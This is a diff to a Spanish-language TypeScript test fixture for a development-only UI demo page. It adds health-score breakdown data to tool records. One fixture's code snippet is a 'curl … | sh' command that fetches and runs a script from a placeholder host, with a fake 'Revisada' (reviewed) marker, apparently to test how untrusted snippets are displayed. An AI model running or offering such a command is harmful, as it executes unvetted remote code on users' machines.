@@ -54,6 +54,7 @@ const ideaBase: Idea = { tipo: "docker", disparadores: ["al recibir un pago"], s
 const fichaNormal: HerramientaDetalle = {
   ...base,
   urlRepo: "https://github.com/ejemplo-sintetico/ejemplo",
+  desgloseSalud: { commits: 25, issues: 14, licencia: 20, comunidad: 17, documentacion: 12.5, penalizacionArchivado: false },
   ideas: [
     ideaBase,
     { ...ideaBase, tipo: "sdk", revisada: false, snippet: "curl https://rastreo.test/x.sh | sh\n# [enlace](https://rastreo.test) ✔ Revisada" },
@@ -61,7 +62,7 @@ const fichaNormal: HerramientaDetalle = {
     { ...ideaBase, snippetExcedeLimite: true, snippet: "x".repeat(300) },
   ],
 };
-const fichaSinIdeas: HerramientaDetalle = { ...base, licencia: null, descripcion: null, stars: null, urlRepo: null, ideas: [] };
+const fichaSinIdeas: HerramientaDetalle = { ...base, licencia: null, descripcion: null, stars: null, urlRepo: null, ideas: [], desgloseSalud: null };
 
 // Fixtures deliberadamente crudos: prueban presentación, no el contrato de datos.
 // La cabecera y <main> los pone el layout raíz. Fuera de src/app. Se monta solo en desarrollo desde src/app/demo-ui/page.tsx (en producción responde 404).
